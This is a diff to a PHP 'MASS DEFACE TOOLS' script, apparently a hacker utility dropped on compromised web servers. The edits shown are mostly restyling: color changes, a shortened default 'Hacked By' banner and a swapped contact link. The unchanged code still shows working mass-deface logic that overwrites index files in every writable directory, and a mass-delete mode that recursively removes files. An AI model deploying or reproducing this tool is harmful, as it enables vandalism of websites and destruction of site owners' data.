@@ -12,8 +12,8 @@ body {
 }
 input[type=text]{
 	background: transparent; 
-	color: aqua; 
-	border: 1px solid aqua; 
+	color: lime; 
+	border: 1px solid lime; 
 	margin: 5px auto;
 	padding-left: 5px;
 	font-family: 'Iceberg';
@@ -22,7 +22,7 @@ input[type=text]{
 input[type=submit]{
    background: transparent;
    color: white;
-   border: 1px solid aqua;
+   border: 1px solid lime;
    margin: 5px auto;
    padding-left: 5px;
    font-family: 'Iceberg';
@@ -30,19 +30,19 @@ input[type=submit]{
 }
 textarea[name=script] {
 	background: transparent;
-	color: aqua; 
-	border: 1px solid aqua; 
+	color: lime; 
+	border: 1px solid lime; 
 	margin: 5px auto;
 	padding-left: 5px;
 	font-family: 'Iceberg';
 	font-size: 15px;
 }
 a,h1 {
-	color: aqua;
+	color: lime;
 	text-decoration: none;
 }
 a:hover {
-	color: aqua;
+	color: lime;
 }
 #wible {
 font-family: Courier;
@@ -54,7 +54,7 @@ top: 30%;
 }
 </style>
 <div id='wible' align="center">
-<div style="background:transparent;border:2px solid aqua;padding:24px;width:300px;"/>
+<div style="background:transparent;border:2px solid lime;padding:24px;width:300px;"/>
 <a href='?'><h1>MASS DEFACE TOOLS</h1></a><br />
 <a href='?go=mass'>MASS DEFACE</a> |
 <a href='?go=delet'>MASS DELETE</a>
@@ -94,7 +94,7 @@ destination=destinationParam;
 type();
 }
 </script><b>
-<div 0px="" 12px="" ComicSansMs="" color:="" FC0707="" font:="" id="textDestination" margin:="" style="background-color: none;color:aqua;"></div></b>
+<div 0px="" 12px="" ComicSansMs="" color:="" FC0707="" font:="" id="textDestination" margin:="" style="background-color: none;color:lime;"></div></b>
 <script language="JavaScript">
 javascript:startTyping(text, 50, "textDestination");
 </script></center>
@@ -132,7 +132,7 @@ elseif($_GET['go'] == 'mass'){
 				} else {
 					if(is_dir($dirc)) {
 						if(is_writable($dirc)) {
-							echo "[<font color=#18BC9C>DONE</font>] $lokasi<br>";
+							echo "[<font color=#00FF00>DONE</font>] $lokasi<br>";
 							file_put_contents($lokasi, $isi_script);
 							$idx = mass_kabeh($dirc,$namafile,$isi_script);
 						}
@@ -154,7 +154,7 @@ elseif($_GET['go'] == 'mass'){
 				} else {
 					if(is_dir($dirc)) {
 						if(is_writable($dirc)) {
-							echo "[<font color=#18BC9C>DONE</font>] $dirb/$namafile<br>";
+							echo "[<font color=#00FF00>DONE</font>] $dirb/$namafile<br>";
 							file_put_contents($lokasi, $isi_script);
 						}
 					}
@@ -177,17 +177,17 @@ elseif($_GET['go'] == 'mass'){
 	echo "<center>";
 	echo "<form method='post'>
 	<font style='text-decoration: underline;'>Tipe:</font><br>
-	<div style='background:transparent;border:1px solid aqua;padding:5px;width:300px;'/>
+	<div style='background:transparent;border:1px solid lime;padding:5px;width:300px;'/>
 	<input type='radio' name='tipe' value='biasa' checked>Biasa<input type='radio' name='tipe' value='massal'>Massal</div><br>
 	<font style='text-decoration: underline;'>Dir:</font><br>
 	<input type='text' name='d_dir' value='$dir' style='width: 300px;' height='10'><br>
 	<font style='text-decoration: underline;'>Filename:</font><br>
 	<input type='text' name='d_file' value='index.php' style='width: 300px;' height='10'><br>
 	<font style='text-decoration: underline;'>Index File:</font><br>
-	<textarea name='script' style='width: 300px; height: 300px;'>Hacked By Rizredvlo7zer0✬ | GARUDA TERSAKTI 72</textarea><br>
+	<textarea name='script' style='width: 300px; height: 300px;'>Hacked By Rizredvlo7zer0✬</textarea><br>
 	<input type='submit' name='start' value='Goo!' style='width: 300px;' class='btn btn-success btn-sm'>
 	</form>";
-		echo"<u><a href='https://api.whatsapp.com/send?phone=6285745620638&text=' target='_blank'>Say hello to me :)</a><u/></center>";
+		echo"<u><a href='http://facebook.com/Tubagus19.id' target='_blank'>Say hello to me :)</a><u/></center>";
 	}
 }
 elseif($_GET['go'] == 'delet') {
@@ -209,7 +209,7 @@ elseif($_GET['go'] == 'delet') {
 					if(is_dir($dirc)) {
 						if(is_writable($dirc)) {
 							if(file_exists($lokasi)) {
-								echo "[<font color=#18BC9C>DELETED</font>] $lokasi<br>";
+								echo "[<font color=#00FF00>DELETED</font>] $lokasi<br>";
 								unlink($lokasi);
 								$idx = hapus_massal($dirc,$namafile);
 							}
